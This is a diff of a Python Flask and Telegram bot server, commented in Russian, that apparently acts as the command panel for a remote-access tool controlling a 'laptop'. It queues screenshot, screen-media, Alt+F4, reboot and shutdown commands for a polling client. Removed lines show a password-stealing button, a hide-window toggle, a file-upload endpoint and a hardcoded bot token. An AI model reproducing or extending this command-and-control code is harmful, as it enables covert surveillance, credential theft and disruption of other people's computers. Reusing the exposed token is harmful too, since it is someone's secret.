@@ -1,6 +1,8 @@
 import os
 import json
 import uuid
+import threading
+import time
 from datetime import datetime, timedelta
 from flask import Flask, request, jsonify
 from telegram import Bot, Update, InlineKeyboardButton, InlineKeyboardMarkup
@@ -9,26 +11,23 @@ from telegram.ext import Updater, CommandHandler, CallbackQueryHandler, MessageH
 app = Flask(__name__)
 
 # ===== КОНФИГУРАЦИЯ =====
-TOKEN = "8004274832:AAGbnNEvxH09Ja9OdH9KoEOFZfCl98LsqDU"  # Токен от @BotFather
-SECRET_KEY = "YOUR_SECRET_KEY"  # Должен совпадать с ключом на клиенте
+TOKEN = os.environ.get('TOKEN')  # Токен из переменных окружения Render
+SECRET_KEY = os.environ.get('SECRET_KEY')  # Секретный ключ из переменных окружения
 PORT = int(os.environ.get('PORT', 5000))
 # ========================
 
 bot = Bot(token=TOKEN)
-clients = {}  # Словарь для хранения состояния клиентов
-pending_commands = {}  # Очередь команд
+clients = {}
+pending_commands = {}
 
-# Меню управления
+# Меню управления (упрощенное)
 KEYBOARD_LAYOUT = [
-    [InlineKeyboardButton("🖥 IP адрес", callback_data='ip'),
-     InlineKeyboardButton("📸 Скриншот", callback_data='screenshot')],
-    [InlineKeyboardButton("🎥 Видео на экран", callback_data='play_video'),
-     InlineKeyboardButton("🖼 Фото на экран", callback_data='play_photo')],
-    [InlineKeyboardButton("❌ Alt+F4", callback_data='altf4'),
-     InlineKeyboardButton("🔒 Получить пароли", callback_data='passwords')],
+    [InlineKeyboardButton("📸 Скриншот", callback_data='screenshot')],
+    [InlineKeyboardButton("🖼 Фото на экран", callback_data='play_photo'),
+     InlineKeyboardButton("🎥 Видео на экран", callback_data='play_video')],
+    [InlineKeyboardButton("❌ Alt+F4", callback_data='altf4')],
     [InlineKeyboardButton("🔄 Перезагрузить", callback_data='reboot'),
-     InlineKeyboardButton("⏹ Выключить", callback_data='shutdown')],
-    [InlineKeyboardButton("👻 Скрыть/Показать", callback_data='toggle_visibility')]
+     InlineKeyboardButton("⏹ Выключить", callback_data='shutdown')]
 ]
 
 @app.route('/heartbeat', methods=['POST'])
@@ -51,10 +50,11 @@ def get_commands():
     """Получение команд для клиента"""
     client_key = request.args.get('key')
     if client_key != SECRET_KEY:
-        return jsonify([])
+        return jsonify([]), 401
     
-    client_ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0]
+    client_ip = request.remote_addr
     commands = pending_commands.get(client_ip, [])
+    pending_commands[client_ip] = []
     return jsonify(commands)
 
 @app.route('/complete', methods=['POST'])
@@ -64,7 +64,7 @@ def complete_command():
     if data.get('key') != SECRET_KEY:
         return jsonify({'status': 'unauthorized'}), 401
     
-    client_ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0]
+    client_ip = request.remote_addr
     command_id = data.get('command_id')
     
     if client_ip in pending_commands:
@@ -75,32 +75,12 @@ def complete_command():
     
     return jsonify({'status': 'ok'})
 
-@app.route('/upload', methods=['POST'])
-def upload_file():
-    """Загрузка файлов от клиента"""
-    if request.form.get('key') != SECRET_KEY:
-        return jsonify({'status': 'unauthorized'}), 401
-    
-    file = request.files.get('file')
-    file_type = request.form.get('type', 'file')
-    client_ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0]
-    
-    if file:
-        # Для демонстрации просто сохраняем файл
-        filename = f"{file_type}_{client_ip}_{int(datetime.now().timestamp())}"
-        file.save(os.path.join('uploads', filename))
-        
-        return jsonify({'status': 'success'})
-    
-    return jsonify({'status': 'no_file'}), 400
-
 def send_menu(chat_id):
     """Отправка меню с кнопками"""
     bot.send_message(
         chat_id=chat_id,
-        text="🔒 <b>Управление ноутбуком</b> 🔒\nВыберите действие:",
-        reply_markup=InlineKeyboardMarkup(KEYBOARD_LAYOUT),
-        parse_mode='HTML'
+        text="🔒 Управление ноутбуком\nВыберите действие:",
+        reply_markup=InlineKeyboardMarkup(KEYBOARD_LAYOUT)
     )
 
 def button_handler(update: Update, context):
@@ -111,17 +91,13 @@ def button_handler(update: Update, context):
     chat_id = query.message.chat_id
     
     try:
-        # Получаем первый доступный клиент
         client_id = next(iter(clients.keys()), None)
         
         if not client_id:
             bot.send_message(chat_id, "⚠️ Нет подключенных устройств")
             return
         
-        if data == 'ip':
-            bot.send_message(chat_id, f"📡 IP адрес устройства: {clients[client_id]['ip']}")
-        
-        elif data == 'screenshot':
+        if data == 'screenshot':
             command = {
                 'id': str(uuid.uuid4()),
                 'type': 'screenshot',
@@ -130,13 +106,10 @@ def button_handler(update: Update, context):
             pending_commands.setdefault(client_id, []).append(command)
             bot.send_message(chat_id, "📸 Запрошен скриншот...")
         
-        elif data == 'play_video':
-            bot.send_message(chat_id, "📹 Отправьте видео файл...")
-            context.user_data['awaiting_media'] = {'type': 'video', 'client': client_id}
-        
-        elif data == 'play_photo':
-            bot.send_message(chat_id, "🖼 Отправьте фото...")
-            context.user_data['awaiting_media'] = {'type': 'image', 'client': client_id}
+        elif data in ('play_video', 'play_photo'):
+            media_type = 'video' if data == 'play_video' else 'image'
+            bot.send_message(chat_id, f"📹 Отправьте {'видео' if media_type == 'video' else 'фото'} файл...")
+            context.user_data['awaiting_media'] = {'type': media_type, 'client': client_id}
         
         elif data == 'altf4':
             command = {
@@ -165,8 +138,6 @@ def button_handler(update: Update, context):
             pending_commands.setdefault(client_id, []).append(command)
             bot.send_message(chat_id, "⏹ Команда выключения отправлена")
         
-        # Обновляем меню
-        send_menu(chat_id)
         bot.answer_callback_query(query.id)
     
     except Exception as e:
@@ -183,79 +154,69 @@ def media_handler(update: Update, context):
     media_type = media_info.get('type')
     
     try:
+        file_id = None
+        
         if media_type == 'image' and update.message.photo:
-            photo = update.message.photo[-1]
-            file = bot.get_file(photo.file_id)
-            file_url = file.file_path
-            
-            command = {
-                'id': str(uuid.uuid4()),
-                'type': 'media',
-                'media_type': 'image',
-                'url': file_url,
-                'timestamp': datetime.now().isoformat()
-            }
-            pending_commands.setdefault(client_id, []).append(command)
-            bot.send_message(chat_id, "✅ Фото отправлено на устройство")
-        
+            file_id = update.message.photo[-1].file_id
         elif media_type == 'video' and update.message.video:
-            video = update.message.video
-            file = bot.get_file(video.file_id)
-            file_url = file.file_path
-            
+            file_id = update.message.video.file_id
+        
+        if file_id:
+            file = bot.get_file(file_id)
             command = {
                 'id': str(uuid.uuid4()),
                 'type': 'media',
-                'media_type': 'video',
-                'url': file_url,
+                'media_type': media_type,
+                'url': file.file_path,
                 'timestamp': datetime.now().isoformat()
             }
             pending_commands.setdefault(client_id, []).append(command)
-            bot.send_message(chat_id, "✅ Видео отправлено на устройство")
+            bot.send_message(chat_id, f"✅ {'Фото' if media_type == 'image' else 'Видео'} отправлено на устройство")
         
-        # Очищаем состояние ожидания
         del context.user_data['awaiting_media']
         send_menu(chat_id)
     
     except Exception as e:
         bot.send_message(chat_id, f"⚠️ Ошибка обработки медиа: {str(e)}")
 
-def start_bot():
-    """Запуск Telegram бота"""
-    updater = Updater(token=TOKEN, use_context=True)
-    dp = updater.dispatcher
-    
-    # Обработчики
-    dp.add_handler(CommandHandler('start', lambda u,c: send_menu(u.message.chat_id)))
-    dp.add_handler(CallbackQueryHandler(button_handler))
-    dp.add_handler(MessageHandler(Filters.photo | Filters.video, media_handler))
-    
-    # Запуск бота
-    updater.start_polling()
-    updater.idle()
+def start(update: Update, context):
+    """Обработчик команды /start"""
+    send_menu(update.message.chat_id)
+
+def cleanup_clients():
+    """Очистка неактивных клиентов"""
+    while True:
+        try:
+            now = datetime.now()
+            for client_id, client_data in list(clients.items()):
+                if now - client_data['last_seen'] > timedelta(minutes=5):
+                    del clients[client_id]
+        except:
+            pass
+        time.sleep(300)
 
 @app.route('/')
 def home():
     return "PC Control Bot is running!"
 
-def cleanup_clients():
-    """Очистка неактивных клиентов"""
-    while True:
-        now = datetime.now()
-        for client_id, client_data in list(clients.items()):
-            if now - client_data['last_seen'] > timedelta(minutes=5):
-                del clients[client_id]
-        time.sleep(300)
+def run_bot():
+    """Запуск Telegram бота"""
+    updater = Updater(token=TOKEN, use_context=True)
+    dp = updater.dispatcher
+    
+    dp.add_handler(CommandHandler('start', start))
+    dp.add_handler(CallbackQueryHandler(button_handler))
+    dp.add_handler(MessageHandler(Filters.photo | Filters.video, media_handler))
+    
+    updater.start_polling()
+    updater.idle()
 
 if __name__ == '__main__':
-    # Создаем папку для загрузок
-    os.makedirs('uploads', exist_ok=True)
-    
     # Запускаем очистку клиентов в фоне
     threading.Thread(target=cleanup_clients, daemon=True).start()
     
     # Запускаем бота в отдельном потоке
-    threading.Thread(target=start_bot, daemon=True).start()
+    threading.Thread(target=run_bot, daemon=True).start()
     
     # Запускаем Flask сервер
     app.run(host='0.0.0.0', port=PORT)
